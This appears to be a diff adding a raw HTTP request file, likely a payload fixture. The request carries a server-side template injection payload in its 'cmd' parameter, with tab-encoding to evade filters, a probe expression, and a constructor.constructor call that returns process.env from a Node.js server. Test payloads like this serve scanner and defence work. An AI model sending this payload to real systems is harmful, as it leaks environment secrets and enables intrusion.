@@ -1,0 +1,4 @@
+GET /a?cmd={{%09'a'.toUpperCase()%09}}{{%09constructor.constructor('return%09process.env')()%09}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
